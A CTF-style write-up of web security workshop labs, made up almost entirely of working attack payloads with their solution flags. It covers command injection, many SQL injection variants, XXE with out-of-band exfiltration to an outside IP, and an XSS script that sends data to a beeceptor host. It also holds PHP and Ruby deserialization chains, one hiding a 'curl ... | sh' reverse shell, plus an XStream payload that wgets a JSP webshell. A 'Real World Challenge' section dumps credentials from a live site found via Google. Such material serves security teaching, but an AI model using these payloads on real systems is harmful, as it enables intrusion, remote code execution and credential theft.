# Web Security Workshop Write-ups

## 0x00 Web Security Workshop Write-ups

> Author: Boik

## 0x01 Lab 1

1. `http://127.0.0.1:8080/index.php?password=1&secret_key=1`
    - ![](https://i.imgur.com/0WUnkaF.png)

**Flag: `CTF{17_5_v3ry_345y}`**

## 0x02 Lab 2

1. `http://127.0.0.1:8081/nslookup.php?nslookup=;find / -name flag.txt`
    - ![](https://i.imgur.com/Red7dqg.png)
2. `http://127.0.0.1:8081/nslookup.php?nslookup=;cat /var/git/flag.txt`
    - ![](https://i.imgur.com/ucEsLXW.png)

**Flag: `CTF{Hel10_wor14}`**

## 0x03 Lab 3

1. `http://127.0.0.1:8082/dir.php?user=root";system("/usr/b*n/find / -name flag.txt");USER="`
    - ![](https://i.imgur.com/BwKVVdV.png)
2. `http://127.0.0.1:8082/dir.php?user=root";system("/b*n/cat /usr/lib/ssh/flag.txt");USER="`
    - ![](https://i.imgur.com/mbiwH5p.png)

**Flag: `CTF{04y0_h4w411}`**

## 0x04 MySQL UNION based SQLi Practice

1. `http://127.0.0.1:8083/?id=1 and 1=2 UNION SELECT 1, 2`
    - ![](https://i.imgur.com/Wa2oX0Z.png)
2. `http://127.0.0.1:8083/?id=1 and 1=2 UNION SELECT (SELECT content FROM flags limit 1, 2), 2`
    - ![](https://i.imgur.com/6r72Ze4.png)

**Flag: `CTF{un10n_5ql_1nj3c710n_15_345y}`**

## 0x05 MSSQL UNION based SQLi Practice

1. `http://127.0.0.1:8084/?id=1 AND 1=2 UNION SELECT 1, 2`
    - ![](https://i.imgur.com/9BaTDa6.png)
2. `http://127.0.0.1:8084/?id=1 AND 1=2 UNION SELECT (SELECT TOP 1 content From (SELECT Top 2 content FROM Flags ORDER BY content ASC)x) ,2`
    - ![](https://i.imgur.com/iTvro2Q.png)

**Flag: `CTF{1_l0v3_bu7_h473_m55ql}`**

## 0x06 Oracle UNION based SQLi Practice

1. `http://127.0.0.1:8085/?id=1 AND 1=2 UNION SELECT '1', '2' FROM dual`
    - ![](https://i.imgur.com/QNIq9Zm.png)
2. `
http://127.0.0.1:8085/?id=1 AND 1=2 UNION SELECT
((SELECT OBJECT_NAME FROM (SELECT OBJECT_NAME FROM user_objects WHERE object_type='TABLE' ORDER BY created DESC) WHERE ROWNUM < 3)
MINUS
(SELECT OBJECT_NAME FROM (SELECT OBJECT_NAME FROM user_objects WHERE object_type='TABLE' ORDER BY created DESC) WHERE ROWNUM < 2)), '2' FROM dual
`
    - ![](https://i.imgur.com/1olPXIh.png)
3. `http://127.0.0.1:8085/?id=1 AND 1=2 UNION SELECT column_name, '2' FROM all_tab_columns WHERE table_name='FLAGS'`
    - ![](https://i.imgur.com/cNRk1b4.png)
4. `http://127.0.0.1:8085/?id=1 AND 1=2 UNION SELECT content, '2' FROM flags`
    - ![](https://i.imgur.com/SzlUNtL.png)

**Flag: `CTF{0r4cl3_61mm3_r4cl3}`**

## 0x07 MySQL ERROR based SQLi Practice

1. `http://127.0.0.1:8086/?id=1 AND (updatexml(null, concat(0x3a, (SELECT user())), null))=1`
    - ![](https://i.imgur.com/lQphddf.png)
2. `http://127.0.0.1:8086/?id=1 AND (SELECT 1 FROM(SELECT count(*), concat(floor(rand(1337)*2),(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)) AS x FROM information_schema.tables GROUP BY x)AS b)`
    - ![](https://i.imgur.com/R8H71UJ.png)
3. `http://127.0.0.1:8086/?id=1 AND (SELECT 1 FROM(SELECT count(*), concat(floor(rand(1337)*2),(SELECT content FROM flags LIMIT 1,1)) AS x FROM information_schema.tables GROUP BY x)AS b)`
    - ![](https://i.imgur.com/C0y33qz.png)

**Flag: `CTF{3rr0r_5ql_2nj3c710n_15_345y}`**

## 0x08 MSSQL ERROR based SQLi Practice

1. `http://127.0.0.1:8087/?id=4 AND (SELECT TOP 1 table_name FROM information_schema.tables)=0`
    - ![](https://i.imgur.com/ftu5pIj.png)
2. `http://127.0.0.1:8087/?id=4 and (SELECT TOP 1 content From (SELECT Top 2 content FROM Flags ORDER BY content)x)=1`
    - ![](https://i.imgur.com/BE3l9cA.png)

**Flag: `CTF{un1v3r54l_l337}`**

## 0x09 Oracle ERROR based SQLi Practice

1. `http://127.0.0.1:8088/?id=1 and CTXSYS.DRITHSX.SN(user, (((SELECT OBJECT_NAME FROM (SELECT OBJECT_NAME FROM user_objects WHERE object_type='TABLE' ORDER BY created DESC) WHERE ROWNUM < 3) MINUS (SELECT OBJECT_NAME FROM (SELECT OBJECT_NAME FROM user_objects WHERE object_type='TABLE' ORDER BY created DESC) WHERE ROWNUM < 2))))=1`
    - ![](https://i.imgur.com/WHuHdGD.png)
2. `http://127.0.0.1:8088/?id=1 and CTXSYS.DRITHSX.SN(user, (((SELECT content FROM flags WHERE ROWNUM < 3) MINUS (SELECT content FROM flags WHERE ROWNUM < 2))))=1`
    - ![](https://i.imgur.com/ad7FYuv.png)

**Flag: `CTF{0r4cl3_61mm3_error}`**

## 0x0A MSSQL TIME based SQLi Practice

1. `http://127.0.0.1:8089/?id=1 if 1=1 waitfor delay '0:0:10'`
    - ![](https://i.imgur.com/qY4oq7Z.png)
2. `http://127.0.0.1:8089/?id=1 if (SELECT TOP 1 ascii(substring(content, 1, 1)) FROM (SELECT Top 2 * FROM Flags ORDER BY content ASC)x) = 67 waitfor delay '0:0:3'`
    - ![](https://i.imgur.com/c3nOZoC.png)

**Flag: `CTF{a}`**

## 0x0B Oracle Out-of-Band based SQLi Practice

1. `http://127.0.0.1:8090/?id=2-utl_http.request('http://x.x.x.x/boikishere')`
    - ![](https://i.imgur.com/Kqv8DyN.png)
2. `http://127.0.0.1:8090/?id=2-utl_http.request('http://x.x.x.x/' || (SELECT user FROM dual))`
    - ![](https://i.imgur.com/2gz1kbH.png)
3. `http://127.0.0.1:8090/?id=2-utl_http.request('http://x.x.x.x/' || ((SELECT content FROM (SELECT content FROM flags) WHERE ROWNUM < 3) MINUS (SELECT content FROM (SELECT content FROM flags) WHERE ROWNUM < 2)))`
    - ![](https://i.imgur.com/oR6oMMt.png)

**Flag: `CTF{0r4cl3_61mm3_00b}`**

## 0x0C Real World Challenge

1. Google `cei8a` and log in
    - ![](https://i.imgur.com/JkTd6fQ.png)
2. Found `teacher.php`'s parameter `td` is prone to SQL Injection
3. By testing `teacher.php?td=wa'||'ng` and `teacher.php?td=wang' and 2=1--`, we guess it's `PostgreSQL` or `SQLite`
4. Get tables' names: `teacher.php?td=' union select null,table_name,null,null,null,null,null,null,null,null,null,null from information_schema.tables where table_catalog=current_database() and table_schema='public' limit 1 offset 0`
5. A `union` based injection is also feasible: `teacher.php?td=' union select '1',null,'3',version(),current_database(),'6',current_user,username,passwd,'10','11','12' from teacher limit 1 offset 0--`, we get the flag

**Flag: `FLAG{Easy_blacbox_postgresql_injection:)}`**

## 0x0D A2 - Practice 1

![](https://i.imgur.com/s9gYaSz.png)

**Flag: `CTF{f0r637_my_p455w0rd_l0l}`**

## 0x0E A2 - Practice 2

![](https://i.imgur.com/Qi51jJk.png)

**Flag: `CTF{l061c_fl0w_15_b4d455}`**

## 0x0F A4 - Practice 1

![](https://i.imgur.com/3IEHHLC.png)

- feed src
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE rss [
        <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
    <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>test</title>
        <link>http://example.com/</link>
        <description>test</description>
        <lastBuildDate>Mn, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
        <item>
            <title>item - test</title>
            <link>http://example.com</link>
            <description>&xxe;</description>
            <author>author</author>
            <pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
        </item>
    </channel>
    </rss>
    ```
- ![](https://i.imgur.com/2bvhDRg.png)

**Flag: `CTF{xxe_via_rss}`**

## 0x10 A4 - Practice 2

![](https://i.imgur.com/2SPsamQ.png)

1. Error based
    - feed src
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE rss [
            <!ENTITY % xxe SYSTEM "file:///flag.txt">
            %xxe;
        ]>
        <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
        <channel>
            <title>test</title>
            <link>http://example.com/</link>
            <description>test</description>
            <lastBuildDate>Mn, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
            <item>
                <title>item - test</title>
                <link>http://example.com</link>
                <description>&xxe;</description>
                <author>author</author>
                <pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
            </item>
        </channel>
        </rss>
        ```
    - ![](https://i.imgur.com/oz70W3E.png)
2. OOB
    - feed src
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE rss [
            <!ENTITY % asd SYSTEM "http://169.254.54.54:8080/evil.dtd">
            %asd; %c;
        ]>
        <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
        <channel>
            <title>test</title>
            <link>http://example.com/</link>
            <description>test</description>
            <lastBuildDate>Mn, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
            <item>
                <title>item - test</title>
                <link>http://example.com</link>
                <description>&rrr;</description>
                <author>author</author>
                <pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
            </item>
        </channel>
        </rss>
        ```
    - evil.dtd
        ```xml
        <!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=file:///flag.txt">
        <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://169.254.54.54:2121/%d;'>">
        ```
    - ![](https://i.imgur.com/I4OqpPA.png)

**Flag: `CTF{xxe_oob_via_rss}`**

## 0x11 A4 - Practice 3

![](https://i.imgur.com/2Otjcq3.png)

- feed src
    1. `echo -n '<?xml version="1.0" encoding="UTF-16BE"' > payload.xml`
    2. `echo '?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///flag.txt">]><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>test</title><link>http://example.com/</link><description>test</description><lastBuildDate>Mn, 02 Feb 2015 00:00:00 -0000</lastBuildDate><item><title>item - test</title><link>http://example.com</link><description>&xxe;</description><author>author</author><pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate></item></channel></rss>' | iconv -f UTF-8 -t UTF-16BE >> payload.xml`
    3. `cat payload.xml`
        ```xml
        <?xml version="1.0" encoding="UTF-16BE" ? > < ! D O C T Y P E   r s s   [ < ! E N T I T Y   x x e   S Y S T E M   " f i l e : / / / f l a g . t x t " > ] > < r s s   v e r s i o n = " 2 . 0 "   x m l n s : a t o m = " h t t p : / / w w w . w 3 . o r g / 2 0 0 5 / A t o m " > < c h a n n e l > < t i t l e > t e s t < / t i t l e > < l i n k > h t t p : / / e x a m p l e . c o m / < / l i n k > < d e s c r i p t i o n > t e s t < / d e s c r i p t i o n > < l a s t B u i l d D a t e > M n ,   0 2   F e b   2 0 1 5   0 0 : 0 0 : 0 0   - 0 0 0 0 < / l a s t B u i l d D a t e > < i t e m > < t i t l e > i t e m   -   t e s t < / t i t l e > < l i n k > h t t p : / / e x a m p l e . c o m < / l i n k > < d e s c r i p t i o n > & x x e ; < / d e s c r i p t i o n > < a u t h o r > a u t h o r < / a u t h o r > < p u b D a t e > M o n ,   0 2   F e b   2 0 1 5   0 0 : 0 0 : 0 0   - 0 0 0 0 < / p u b D a t e > < / i t e m > < / c h a n n e l > < / r s s > 
        ```
- ![](https://i.imgur.com/0iXL9Tl.png)

**Flag: `CTF{xxe_via_rss_with_two_encodings}`**

## 0x12 A5 - Practice 1

1. `http://127.0.0.1:8096/robots.txt`
    - ![](https://i.imgur.com/GJo4tSm.png)

**Flag: `CTF{b14blab1a}`**

## 0x13 A5 - Practice 2

1. `curl 'http://127.0.0.1:8097/index.php?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"`
    - ![](https://i.imgur.com/KRdbG8e.png)

**Flag: `CTF{haha!i_bypassed_the_fucking_waf!}`**

## 0x14 A5 - Practice 3

1. `http://127.0.0.1:8098/?page=./upload`
2. `echo -n "<?= file_get_contents('./flag.php') ?>" > a.php && zip wtf.zip a.php && mv wtf.zip wtf.zip.txt`
3. `http://127.0.0.1:8098/?page=phar://EuUPlHleiEiGyoXT.txt/a`
    - ![](https://i.imgur.com/rCeTAHO.png)

**Flag: `CTF{ph4r_lf1_15_4w350m3}`**

## 0x15 A6 - Practice 1

1. `http://127.0.0.1:8099/uploadfiles/nginx.png/.php`
    - ![](https://i.imgur.com/ZjCv2Kb.png)

**Flag: `CTF{n4n1k0r3_qq}`**

## 0x16 A6 - Practice 2

1. `http://127.0.0.1:8100/static../app.py`
2. `http://127.0.0.1:8100/static../flag.txt`

**Flag: `CTF{stati.....c}`**

## 0x17 A7 - Reflected XSS - Practice 1

https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-2

## 0x18 A7 - Reflected XSS - Practice 2

https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-8

## 0x19 A7 - XSS Kitchen

- Ypu can guess or leak each question via SSRF
    ```javascript
    setTimeout(() => {
        function reqListener() {
        var e=btoa(this.responseText);
        document.write(
            `<iframe src="https://testbb.free.beeceptor.com/?a=${e}"></iframe>`);
        }
        var oReq = new XMLHttpRequest;
        oReq.addEventListener(‘load’,reqListener);
        oReq.open('GET', 'http://localhost/server/10.php');
        oReq.send();
    });
    ```
- Ans: ```a`*///">--></title></style></xmp><script>prompt()</script><svg/onload=prompt()>```
    - ![](https://i.imgur.com/TZ5Pnea.jpg)

**Flag: `FLAG{y0u_R_XsS_M4st3r!}`**

## 0x1A A8 - Practice 1

1. `http://127.0.0.1:8101/.git/`
2. POST /result.php with COOKIE: `O:9:"FileClass":2:{s:8:"filename";s:8:"test.php";s:7:"content";a:1:{i:0;s:25:"<?php $_GET[1]($_GET[2]);";}}`

**Flag: `CTF{51mpl3_d353r14l1z3}`**

## 0x1B A8 - Practice 2

1. `http://127.0.0.1:8102/users?yaml=`, we can pass any value to `yaml` and it will just be fed to `YAML.load`

```ruby
http://127.0.0.1:8102/users
?yaml=---
!ruby/object:Gem::Requirement
requirements:
  !ruby/object:Rack::Session::Abstract::SessionHash
    req: !ruby/object:Rack::Request
      env:
        "rack.session": !ruby/object:Rack::Session::Abstract::SessionHash
          id: 'hi from espr'
        HTTP_COOKIE: "a=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQg6DkBpbnN0YW5jZW86CEVSQgc6CUBzcmNJIjpgY3VybCBodHRwczovL3NoZWxsLm5vdy5zaC8xOTIuMTY4LjEwLjE1MDoxMzM3IHwgc2hgCgY6BkVUOgxAbGluZW5vaQI5BToMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvcm86H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uBjoOQHNpbGVuY2VkVA=="
    store: !ruby/object:Rack::Session::Cookie
      coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
      key: a
      secrets: []
    exists: true
    loaded: false
```

- ![](https://i.imgur.com/9pxjwsd.png)

**Flag: `FLAG{Just_a_flag}`**

## 0x1C A9 - Practice 1

> PHPMail CVE-2016-10033
> Ref: [PHPMailer 命令执行漏洞（CVE-2016-10033）分析](https://blog.chaitin.cn/phpmailer-cve-2016-10033/)

1. `http://127.0.0.1:8103/`
    - `"vul\" -OQueueDirectory=/tmp -X/var/www/html/phpinfo.php " @t.co`
    - `vul( -OQueueDirectory=/tmp -X/var/www/html/phpinfo.php )@t.co`
    - ![](https://i.imgur.com/FOkU6O5.png)
    - ![](https://i.imgur.com/RbQnGjm.png)

**Flag: `FLAG{Mail_is_dangerous}`**

## 0x1D A9 - Practice 2

```
POST /orders/3/edit HTTP/1.1
Host: 127.0.0.1:8104
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/xml
Content-Length: 2540

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>/bin/sh</string>
                        <string>-c</string>
                        <string>cd webapps/ROOT/;wget https://raw.githubusercontent.com/tennc/webshell/master/jspx/jw.jspx</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

- `http://127.0.0.1:8104/jw.jspx?pwd=sin&i=cat /flag.txt`
    - ![](https://i.imgur.com/GqlUYbh.png)

**Flag: `CTF{1m4637r461ck_15_4_m461c}`**

## 0x1E A9 - Practice 3

1. `http://127.0.0.1:8105/?data=O:3:"WEB":4:{s:11:"%00WEB%00method";s:4:"show";s:9:"%00WEB%00args";a:1:{i:0;s:35:"boik'+and+1=2+union+select+1,2,3,'4";}s:9:"%00WEB%00conn";i:0;}`
    - ![](https://i.imgur.com/z6aUm6A.png)
1. `http://127.0.0.1:8105/?data=O:3:"WEB":4:{s:11:"%00WEB%00method";s:4:"show";s:9:"%00WEB%00args";a:1:{i:0;s:70:"boik'+and+1=2+union+select+1,username,3,password+from+users+limit+1--+";}s:9:"%00WEB%00conn";i:0;}`
    - ![](https://i.imgur.com/ouRi3nS.png)
2. `http://127.0.0.1:8105/?data=O:3:"WEB":4:{s:11:"%00WEB%00method";s:5:"login";s:9:"%00WEB%00args";a:2:{i:0;s:5:"bÔik";i:1;s:26:"abcdefghijklmnopqrstuvwxyz";}s:9:"%00WEB%00conn";i:0;}`
    - ![](https://i.imgur.com/KTk6ljx.png)

**Flag: `CTF{php 4nd mysq1 are s0 mag1c, isn't it?}`**
